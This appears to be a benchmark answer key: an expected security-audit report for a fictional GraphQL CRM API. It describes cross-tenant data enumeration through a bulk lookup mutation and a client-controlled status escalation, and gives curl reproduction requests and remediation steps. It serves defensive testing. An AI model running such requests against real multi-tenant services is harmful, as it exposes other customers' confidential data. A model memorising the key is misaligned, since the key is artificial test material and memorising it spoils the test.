# Expected Response

## System
- Domain: B2B SaaS / CRM
- System: PipelinePro Sales API
- Example ID: GQL-0034

## Priority Findings

### Finding 1: Cross-Tenant Bulk Enumeration via bulkProjectLookup — No Per-ID Ownership Filter (Pattern 1.9)
**Severity:** Critical
**Category:** BOLA / Mass Enumeration

**Summary:**
The `bulkProjectLookup` mutation on `POST /graphql` accepts an arbitrary array of `projectId` values and returns data for each without per-ID tenant ownership verification. An attacker from `tenant-e2b2` submitted IDs `["P-2034", "P-1034", "P-3034"]` and received project data belonging to `tenant-47ff`, including `sensitiveField` and `internalNotes`. The resolver's response confirms no cross-tenant authorization check was applied.

**Evidence from HAR:**
- Request: `POST https://api.pipelinepro-sales-ap.example.com/graphql` (2026-04-13T16:22:34Z, 242 ms)
- JWT `x-tenant-id`: `tenant-e2b2` — attacker's identity
- Query payload: `bulkProjectLookup(ids: ["P-2034", "P-1034", "P-3034"]) { projectId tenantId data { sensitiveField } }`
- Response HTTP status: `200 OK` — no authorization error
- Response `tenantId`: `tenant-47ff` — cross-tenant object returned to `tenant-e2b2`
- Response `ownerId`: `other-user-e2b247ff`
- Response `sensitiveField`: `CONFIDENTIAL-e2b247ff` — sensitive data leaked
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-e2b247ff`

**Root Cause:**
Per §4.0 (RISK-GQL-034): "The `bulkProjectLookup` mutation accepts an arbitrary array of IDs without per-ID ownership filtering." The resolver fetches all requested IDs from PostgreSQL without applying `WHERE tenant_id = $jwt.tenantId` per item.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-034 | "resolver does NOT verify that fetched object's tenantId matches the JWT's tenantId" |
| context.txt §4.0 | bulkProjectLookup note | "accepts an arbitrary array of IDs without per-ID ownership filtering" |
| HAR entry | request.postData | `bulkProjectLookup(ids: ["P-2034", "P-1034", "P-3034"])` from `tenant-e2b2` |
| HAR entry | response.content | `tenantId: "tenant-47ff"`, `sensitiveField: "CONFIDENTIAL-e2b247ff"`, `internalNotes: "Internal data exposed"` |

---

### Finding 2: Client-Assumed Authority on updateProject — Status Field Applied Without Server Re-Validation (Pattern 3.1)
**Severity:** High
**Category:** Insecure Design

**Summary:**
Per §5.0, the `updateProject` mutation accepts client-supplied `status` (and price, role) fields in `ProjectInput` and applies them directly without the server re-validating that the authenticated user is authorized to set that value. A caller can escalate a project's `status` to `approved` or `active` regardless of their role.

**Root Cause (§5.0):** "The client supplies price, role, or status fields that the resolver applies without server-side re-validation of the authenticated user's permissions."

---

## Steps to Reproduce

### Step 1 — Confirm attacker baseline (own tenant)
```bash
curl -s -X POST https://api.pipelinepro-sales-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e2b2" \
  -d '{"query": "mutation { bulkProjectLookup(ids: [\"P-1034\"]) { projectId tenantId data { sensitiveField } } }"}'
```
**Expected:** Returns only data for `tenant-e2b2` projects.

### Step 2 — Cross-tenant bulk enumeration (primary attack from HAR)
```bash
curl -s -X POST https://api.pipelinepro-sales-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e2b2" \
  -d '{"query": "mutation { bulkProjectLookup(ids: [\"P-2034\", \"P-1034\", \"P-3034\"]) { projectId tenantId data { sensitiveField internalNotes } } }"}'
```
**Vulnerable outcome:** Returns `tenantId: "tenant-47ff"`, `ownerId: "other-user-e2b247ff"`, `sensitiveField: "CONFIDENTIAL-e2b247ff"`, `internalNotes: "Internal data exposed"` — cross-tenant data access confirmed.
**Secure outcome:** Only projects belonging to `tenant-e2b2` are returned; foreign IDs yield null or FORBIDDEN.

### Step 3 — Status escalation via client-assumed authority
```bash
curl -s -X POST https://api.pipelinepro-sales-ap.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-e2b2" \
  -d '{"query": "mutation { updateProject(id: \"P-1034\", input: {status: \"approved\"}) { projectId status } }"}'
```
**Vulnerable outcome:** `status` field updated to `approved` without server-side role/permission check.
**Secure outcome:** HTTP 403 or `{"errors": [{"message": "Forbidden: insufficient privileges to set status"}]}`.

## Secure Outcome Verification
For **Step 2**, a correctly patched resolver MUST return:
```json
{
  "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }],
  "data": { "bulkProjectLookup": null }
}
```

## Remediation
1. **Per-ID ownership filter in bulkProjectLookup:** Post-fetch, filter out any project whose `tenant_id` ≠ JWT's `tenantId`. Return null or FORBIDDEN for disallowed entries.
2. **Resolver-level tenant guard:** Apply `WHERE project_id = $id AND tenant_id = $jwt.tenantId` on every single-object resolver (§4.0 RISK-GQL-034).
3. **Server-side field privilege re-validation:** In `updateProject`, before applying `status`, `price`, or `role` fields from `ProjectInput`, assert that the authenticated user's role permits that specific field mutation — never trust the client to determine its own authority.
4. **Redis cache key includes tenantId:** Cache key is currently `projectId` only (§2.0); change to `projectId:tenantId` to prevent cross-tenant cache poisoning.
5. **Automated regression tests:** Assert `tenant-e2b2` bulk-requesting `["P-2034", "P-1034", "P-3034"]` receives only own-tenant projects or FORBIDDEN for cross-tenant IDs.
